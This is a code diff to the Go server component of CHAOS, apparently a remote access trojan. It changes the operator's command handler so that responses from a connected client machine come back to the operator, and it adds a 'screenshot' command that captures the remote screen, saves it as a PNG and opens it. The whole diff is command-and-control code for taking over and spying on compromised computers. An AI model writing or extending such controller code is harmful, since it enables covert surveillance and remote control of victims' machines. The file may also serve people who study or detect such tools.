@@ -5,9 +5,11 @@ import (
 	"encoding/base64"
 	"fmt"
 	"github.com/c-bata/go-prompt"
+	"github.com/google/uuid"
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/internal/handler"
 	"github.com/tiagorlampert/CHAOS/internal/ui/completer"
+	"github.com/tiagorlampert/CHAOS/pkg/color"
 	"github.com/tiagorlampert/CHAOS/pkg/system"
 	"github.com/tiagorlampert/CHAOS/pkg/util"
 	"net"
@@ -38,36 +40,56 @@ func (c ClientHandler) executor(input string) {
 	values := strings.Fields(input)
 	for _, v := range values {
 		switch strings.TrimSpace(v) {
+		case "screenshot":
+			fmt.Println(color.Green, "[*] Getting Screenshot...")
+			response, _ := SendCommand(c.Connection, input)
+			saveScreenshot(response)
+			return
 		case "exit":
 			system.QuitApp()
 		default:
-			SendCommand(c.Connection, input)
+			response, _ := SendCommand(c.Connection, input)
+			fmt.Println(string(response))
 			return
 		}
 	}
 }
 
-func SendCommand(conn net.Conn, input string) {
+func SendCommand(conn net.Conn, input string) ([]byte, error) {
 	if err := Write(conn, input); err != nil {
 		log.WithField("cause", err.Error()).Error("error sending command to client")
-		return
+		return nil, err
 	}
 
 	message, err := bufio.NewReader(conn).ReadString('\n')
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error reading response from connection")
-		return
+		return nil, err
 	}
 
 	decoded, err := base64.StdEncoding.DecodeString(message)
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error decoding response from connection")
-		return
+		return nil, err
 	}
-	fmt.Println(string(decoded))
+
+	return decoded, err
 }
 
 func Write(conn net.Conn, v string) error {
 	_, err := conn.Write([]byte(v + util.DelimiterString))
 	return err
+}
+
+func saveScreenshot(response []byte) {
+	util.CreateDirectory(util.TempDirectory)
+
+	filename := fmt.Sprint(util.TempDirectory, uuid.New().String(), ".png")
+	if err := util.WriteFile(filename, response); err != nil {
+		log.WithField("cause", err.Error()).Error("error writing file")
+		return
+	}
+
+	fmt.Println(color.Green, "[*] File saved at", filename)
+	system.RunCmd(fmt.Sprintf("eog %s", filename), 5)
 }
